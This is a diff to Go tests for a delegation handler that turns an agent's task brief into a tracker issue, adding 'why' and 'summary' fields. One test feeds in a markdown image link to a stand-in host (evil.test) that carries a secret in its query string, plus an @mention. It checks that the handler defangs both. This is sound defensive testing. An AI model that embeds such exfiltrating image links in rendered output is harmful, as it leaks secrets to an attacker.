@@ -27,7 +27,7 @@ func TestDelegationFilesAChildWithADependency(t *testing.T) {
 		t.Fatal(err)
 	}
 	wf := &fakeWorkflows{}
-	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: wf, Timeline: nil,
+	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: wf, Timeline: nil, Tries: &BriefTally{},
 		Budget: func() policy.Budget {
 			return policy.Budget{TaskDefaultEUR: 5, TaskMaxEUR: 15, DayEUR: 20, MonthEUR: 50}
 		}})
@@ -36,7 +36,7 @@ func TestDelegationFilesAChildWithADependency(t *testing.T) {
 		h(rr, httptest.NewRequest(http.MethodPost, "/internal/delegations", strings.NewReader(body)))
 		return rr
 	}
-	rr := post(`{"task_id":"t-parent","title":"Add the index","brief":"In store.go add an index on tasks.rung; a test reads it."}`)
+	rr := post(`{"task_id":"t-parent","title":"Add the index","why":"The board reads cards by priority, and the scan is slow.","summary":"It adds an index on the priority column. A test reads cards by priority.","brief":"In store.go add an index on tasks.rung; a test reads it."}`)
 	if rr.Code != http.StatusCreated {
 		t.Fatalf("status %d: %s", rr.Code, rr.Body)
 	}
@@ -49,7 +49,8 @@ func TestDelegationFilesAChildWithADependency(t *testing.T) {
 	}
 	child := store.tasks[res.TaskID]
 	if child.Source != SourceDelegate || child.Parent != "t-parent" || child.Rung != RungCheap || child.Size != "small" || child.Track != policy.TrackDirect ||
-		child.Status != "queued" || child.BudgetEUR != 4 || child.Priority != 2 || child.IssueNumber != res.Issue {
+		child.Status != "queued" || child.BudgetEUR != 4 || child.Priority != 2 || child.IssueNumber != res.Issue ||
+		child.Why != "The board reads cards by priority, and the scan is slow." || child.Summary != "It adds an index on the priority column. A test reads cards by priority." || child.BriefUnchecked {
 		t.Fatalf("child = %+v", child)
 	}
 	if !strings.HasPrefix(child.Objective, "Add the index\n\nDelegated by card #41 (t-parent)") || !strings.HasSuffix(child.Objective, "Size: small\nRung: cheap, delegated routine work") {
@@ -85,17 +86,17 @@ func TestDelegationNeutralisesTheAgentsText(t *testing.T) {
 	if err := store.CreateTask(context.Background(), Task{ID: "t-parent", Status: "running", Repository: "sf/ai-software-factory-code", IssueNumber: 41, Track: "direct"}); err != nil {
 		t.Fatal(err)
 	}
-	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: &fakeWorkflows{},
+	h := DelegationHandler(DelegationDeps{Store: store, Forgejo: fj, Workflows: &fakeWorkflows{}, Tries: &BriefTally{},
 		Budget: func() policy.Budget {
 			return policy.Budget{TaskDefaultEUR: 5, TaskMaxEUR: 15, DayEUR: 20, MonthEUR: 50}
 		}})
 	rr := httptest.NewRecorder()
 	h(rr, httptest.NewRequest(http.MethodPost, "/internal/delegations", strings.NewReader(
-		`{"task_id":"t-parent","title":"Add the index @mallory","brief":"See ![x](https://evil.test/p?d=s3cret) and https://git.example/sf/repo/issues/4."}`)))
+		`{"task_id":"t-parent","title":"Add the index @mallory","why":"The board reads cards by priority, and the scan is slow.","summary":"It adds an index on the priority column. A test reads cards by priority.","brief":"See ![x](https://evil.test/p?d=s3cret) and https://git.example/sf/repo/issues/4."}`)))
 	if rr.Code != http.StatusCreated {
 		t.Fatalf("status %d: %s", rr.Code, rr.Body)
 	}
-	want := "Add the index ＠mallory\n\nDelegated by card #41 (t-parent): it starts when that card is done and builds on its merge.\n\n" +
+	want := "Add the index ＠mallory\n\nWhy: The board reads cards by priority, and the scan is slow.\n\nSummary: It adds an index on the priority column. A test reads cards by priority.\n\n---\n\nDelegated by card #41 (t-parent): it starts when that card is done and builds on its merge.\n\n" +
 		"See ![x](hxxps://evil[.]test/p?d=s3cret) and https://git.example/sf/repo/issues/4.\n\nSize: small\nRung: cheap, delegated routine work"
 	if !slices.Equal(rf.issues, []string{want}) {
 		t.Fatalf("issues %q, want %q", rf.issues, want)
